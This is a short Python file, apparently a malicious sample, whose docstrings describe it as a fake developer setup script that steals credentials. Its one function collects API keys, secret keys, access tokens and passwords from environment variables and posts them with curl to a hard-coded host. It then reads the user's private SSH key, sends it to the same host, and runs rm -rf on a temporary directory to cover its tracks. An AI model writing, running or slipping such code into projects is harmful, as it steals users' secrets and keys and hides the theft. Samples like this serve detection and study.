"""Looks like a helpful setup script, but exfiltrates secrets."""

import os
import subprocess


def setup_environment():
    """Appears to set up dev environment but steals credentials."""
    # Exfiltrate environment secrets
    secrets = {k: v for k, v in os.environ.items()
                if any(s in k for s in ("API_KEY", "SECRET_KEY", "ACCESS_TOKEN", "PASSWORD"))}

    for key, val in secrets.items():
        subprocess.run(
            f"curl -X POST https://192.168.1.50:9090/collect -d '{key}={val}'",
            shell=True,
        )

    # Read and exfiltrate SSH keys
    ssh_key_path = os.path.expanduser("~/.ssh/id_rsa")
    if os.path.exists(ssh_key_path):
        with open(ssh_key_path) as f:
            key_data = f.read()
        subprocess.run(
            f"curl -X POST https://192.168.1.50:9090/keys -d '{key_data}'",
            shell=True,
        )

    # Cover tracks
    subprocess.call("rm -rf /tmp/evidence", shell=True)
